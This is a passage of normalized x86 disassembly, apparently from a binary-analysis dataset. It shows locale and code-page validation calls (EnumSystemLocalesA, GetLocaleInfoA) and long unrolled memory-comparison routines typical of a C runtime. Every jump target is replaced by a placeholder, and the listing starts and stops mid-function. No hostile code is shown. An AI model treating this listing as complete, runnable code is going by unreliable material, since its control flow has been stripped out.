je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
cmp esi 0xfde8
je r-xdata
push ebx
call sub_40c2b0
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_41b961
mov [ edi + 0x14 ] eax
call [ EnumSystemLocalesA@IAT ]
test [ edi + 0x8 ] 0x4
jne r-xdata
mov esi edi
call sub_41bd87
cmp [ eax ] 0x0
je r-xdata
cmp esi 0xfde9
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
and [ edi + 0x8 ] 0x0
jmp r-xdata
push edi
push 0x40
push r--data
call sub_41b7f6
add esp 0xc
test eax eax
je r-xdata
mov esi edi
call sub_41bd20
jmp r-xdata
movzx eax si
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
je r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
push 0x1
push [ edi + 0x18 ]
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
mov esi edi
call sub_41bd87
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov esi edi
call sub_41bd20
jmp r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov cx [ edi + 0x18 ]
mov [ eax ] cx
mov cx [ edi + 0x1c ]
mov [ eax + 0x2 ] cx
mov [ eax + 0x4 ] si
xor eax eax
inc eax
jmp r-xdata
mov esi [ GetLocaleInfoA@IAT ]
mov ecx 0x814
cmp [ eax ] cx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x40
push ebx
push 0x1001
push [ edi + 0x18 ]
call esi
test eax eax
je r-xdata
push r--data
push 0x40
push ebx
call sub_410b69
add esp 0xc
test eax eax
je r-xdata
push 0x40
lea eax [ ebx + 0x40 ]
push eax
push 0x1002
push [ edi + 0x1c ]
call esi
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_4077b7
push 0xa
push 0x10
sub ebx 0xffffff80
push ebx
push [ ebp + 0x8 ]
call sub_41ef98
add esp 0x10
sub_41bfda
mov ax [ esi ]
cmp ax [ ecx ]
je r-xdata
xor eax eax
movzx edx [ ecx ]
movzx eax al
sub eax edx
je r-xdata
movzx eax [ esi + 0x1 ]
movzx ecx [ ecx + 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
retn
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
retn
sub_41c016
mov eax [ esi ]
cmp eax [ ecx ]
je r-xdata
xor eax eax
movzx edx [ ecx ]
movzx eax al
sub eax edx
je r-xdata
movzx eax [ esi + 0x1 ]
movzx edx [ ecx + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
movzx eax [ esi + 0x2 ]
movzx edx [ ecx + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
retn
movzx eax [ esi + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
retn
sub_41c086
mov edi edi
push esi
push edi
mov edi eax
jmp r-xdata
cmp edi 0x20
jae r-xdata
mov eax [ ecx ]
cmp eax [ edx ]
je r-xdata
add ecx edi
add edx edi
cmp edi 0x1f
ja r-xdata
xor eax eax
movzx esi al
movzx eax [ edx ]
sub esi eax
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_41d44e ]
pop edi
pop esi
retn
mov eax [ ecx + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
movzx esi [ ecx + 0x1 ]
movzx eax [ edx + 0x1 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax [ ecx - 0x1c ]
cmp eax [ edx - 0x1c ]
je r-xdata
mov eax [ ecx - 0x18 ]
cmp eax [ edx - 0x18 ]
je r-xdata
mov eax [ ecx - 0x14 ]
cmp eax [ edx - 0x14 ]
je r-xdata
mov eax [ ecx - 0x10 ]
cmp eax [ edx - 0x10 ]
je r-xdata
mov eax [ ecx - 0xc ]
cmp eax [ edx - 0xc ]
je r-xdata
mov eax [ ecx - 0x8 ]
cmp eax [ edx - 0x8 ]
je r-xdata
mov eax [ ecx - 0x4 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ecx - 0x1d ]
cmp eax [ edx - 0x1d ]
je r-xdata
mov eax [ ecx - 0x19 ]
cmp eax [ edx - 0x19 ]
je r-xdata
mov eax [ ecx - 0x15 ]
cmp eax [ edx - 0x15 ]
je r-xdata
mov eax [ ecx - 0x11 ]
cmp eax [ edx - 0x11 ]
je r-xdata
mov eax [ ecx - 0xd ]
cmp eax [ edx - 0xd ]
je r-xdata
mov eax [ ecx - 0x9 ]
cmp eax [ edx - 0x9 ]
je r-xdata
mov eax [ ecx - 0x5 ]
cmp eax [ edx - 0x5 ]
je r-xdata
movzx eax [ ecx - 0x1 ]
movzx ecx [ edx - 0x1 ]
sub eax ecx
je r-xdata
mov eax [ ecx - 0x1e ]
cmp eax [ edx - 0x1e ]
je r-xdata
mov eax [ ecx - 0x1a ]
cmp eax [ edx - 0x1a ]
je r-xdata
mov eax [ ecx - 0x16 ]
cmp eax [ edx - 0x16 ]
je r-xdata
mov eax [ ecx - 0x12 ]
cmp eax [ edx - 0x12 ]
je r-xdata
mov eax [ ecx - 0xe ]
cmp eax [ edx - 0xe ]
je r-xdata
mov eax [ ecx - 0xa ]
cmp eax [ edx - 0xa ]
je r-xdata
mov eax [ ecx - 0x6 ]
cmp eax [ edx - 0x6 ]
je r-xdata
mov ax [ ecx - 0x2 ]
cmp ax [ edx - 0x2 ]
je r-xdata
mov eax [ ecx - 0x1f ]
cmp eax [ edx - 0x1f ]
je r-xdata
mov eax [ ecx - 0x1b ]
cmp eax [ edx - 0x1b ]
je r-xdata
mov eax [ ecx - 0x17 ]
cmp eax [ edx - 0x17 ]
je r-xdata
mov eax [ ecx - 0x13 ]
cmp eax [ edx - 0x13 ]
je r-xdata
mov eax [ ecx - 0xf ]
cmp eax [ edx - 0xf ]
je r-xdata
mov eax [ ecx - 0xb ]
cmp eax [ edx - 0xb ]
je r-xdata
mov eax [ ecx - 0x7 ]
cmp eax [ edx - 0x7 ]
je r-xdata
movzx esi [ ecx - 0x3 ]
movzx eax [ edx - 0x3 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0x4 ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0x2 ]
movzx eax [ edx + 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
xor eax eax
movzx eax [ edx - 0x1c ]
movzx esi [ ecx - 0x1c ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x18 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x14 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x10 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0xc ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x8 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x4 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x1d ]
sub esi eax
je r-xdata
xor eax eax
movzx eax [ edx - 0x19 ]
movzx esi [ ecx - 0x19 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x15 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x11 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0xd ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x9 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x5 ]
sub esi eax
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x1e ]
sub esi eax
je r-xdata
xor eax eax
movzx eax [ edx - 0x1a ]
movzx esi [ ecx - 0x1a ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x16 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x12 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0xe ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0xa ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x6 ]
sub esi eax
je r-xdata
jmp r-xdata
xor eax eax
movzx eax [ edx - 0x1f ]
movzx esi [ ecx - 0x1f ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x1b ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x17 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x13 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0xf ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0xb ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x7 ]
sub esi eax
je r-xdata
movzx esi [ ecx - 0x2 ]
movzx eax [ edx - 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp eax [ edx + 0x8 ]
je r-xdata
movzx esi [ ecx + 0x5 ]
movzx eax [ edx + 0x5 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x3 ]
movzx eax [ edx + 0x3 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1b ]
movzx eax [ edx - 0x1b ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x17 ]
movzx eax [ edx - 0x17 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x13 ]
movzx eax [ edx - 0x13 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xf ]
movzx eax [ edx - 0xf ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xb ]
movzx eax [ edx - 0xb ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x7 ]
movzx eax [ edx - 0x7 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x3 ]
movzx eax [ edx - 0x3 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1c ]
movzx eax [ edx - 0x1c ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x18 ]
movzx eax [ edx - 0x18 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x14 ]
movzx eax [ edx - 0x14 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x10 ]
movzx eax [ edx - 0x10 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xc ]
movzx eax [ edx - 0xc ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x8 ]
movzx eax [ edx - 0x8 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x4 ]
movzx eax [ edx - 0x4 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1d ]
movzx eax [ edx - 0x1d ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x19 ]
movzx eax [ edx - 0x19 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x15 ]
movzx eax [ edx - 0x15 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x11 ]
movzx eax [ edx - 0x11 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xd ]
movzx eax [ edx - 0xd ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x9 ]
movzx eax [ edx - 0x9 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x5 ]
movzx eax [ edx - 0x5 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1e ]
movzx eax [ edx - 0x1e ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1a ]
movzx eax [ edx - 0x1a ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x16 ]
movzx eax [ edx - 0x16 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x12 ]
movzx eax [ edx - 0x12 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xe ]
movzx eax [ edx - 0xe ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xa ]
movzx eax [ edx - 0xa ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x6 ]
movzx eax [ edx - 0x6 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
jmp r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0x8 ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0x6 ]
movzx eax [ edx + 0x6 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
movzx esi [ ecx - 0x1a ]
movzx eax [ edx - 0x1a ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x16 ]
movzx eax [ edx - 0x16 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x12 ]
movzx eax [ edx - 0x12 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xe ]
movzx eax [ edx - 0xe ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xa ]
movzx eax [ edx - 0xa ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x6 ]
movzx eax [ edx - 0x6 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x2 ]
movzx eax [ edx - 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1b ]
movzx eax [ edx - 0x1b ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x17 ]
movzx eax [ edx - 0x17 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x13 ]
movzx eax [ edx - 0x13 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xf ]
movzx eax [ edx - 0xf ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xb ]
movzx eax [ edx - 0xb ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x7 ]
movzx eax [ edx - 0x7 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x3 ]
movzx eax [ edx - 0x3 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1c ]
movzx eax [ edx - 0x1c ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x18 ]
movzx eax [ edx - 0x18 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x14 ]
movzx eax [ edx - 0x14 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x10 ]
movzx eax [ edx - 0x10 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xc ]
movzx eax [ edx - 0xc ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x8 ]
movzx eax [ edx - 0x8 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x4 ]
movzx eax [ edx - 0x4 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1d ]
movzx eax [ edx - 0x1d ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x19 ]
movzx eax [ edx - 0x19 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x15 ]
movzx eax [ edx - 0x15 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x11 ]
movzx eax [ edx - 0x11 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xd ]
movzx eax [ edx - 0xd ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x9 ]
movzx eax [ edx - 0x9 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x5 ]
movzx eax [ edx - 0x5 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax [ ecx + 0xc ]
cmp eax [ edx + 0xc ]
je r-xdata
movzx esi [ ecx + 0x9 ]
movzx eax [ edx + 0x9 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x7 ]
movzx eax [ edx + 0x7 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
movzx esi [ ecx - 0x19 ]
movzx eax [ edx - 0x19 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x15 ]
movzx eax [ edx - 0x15 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x11 ]
movzx eax [ edx - 0x11 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xd ]
movzx eax [ edx - 0xd ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x9 ]
movzx eax [ edx - 0x9 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x5 ]
movzx eax [ edx - 0x5 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx eax [ ecx - 0x1 ]
movzx ecx [ edx - 0x1 ]
sub eax ecx
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1a ]
movzx eax [ edx - 0x1a ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x16 ]
movzx eax [ edx - 0x16 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x12 ]
movzx eax [ edx - 0x12 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xe ]
movzx eax [ edx - 0xe ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xa ]
movzx eax [ edx - 0xa ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x6 ]
movzx eax [ edx - 0x6 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x2 ]
movzx eax [ edx - 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1b ]
movzx eax [ edx - 0x1b ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x17 ]
movzx eax [ edx - 0x17 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x13 ]
movzx eax [ edx - 0x13 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xf ]
movzx eax [ edx - 0xf ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xb ]
movzx eax [ edx - 0xb ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x7 ]
movzx eax [ edx - 0x7 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x3 ]
movzx eax [ edx - 0x3 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1c ]
movzx eax [ edx - 0x1c ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x18 ]
movzx eax [ edx - 0x18 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x14 ]
movzx eax [ edx - 0x14 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x10 ]
movzx eax [ edx - 0x10 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xc ]
movzx eax [ edx - 0xc ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x8 ]
movzx eax [ edx - 0x8 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x4 ]
movzx eax [ edx - 0x4 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0xc ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0xa ]
movzx eax [ edx + 0xa ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
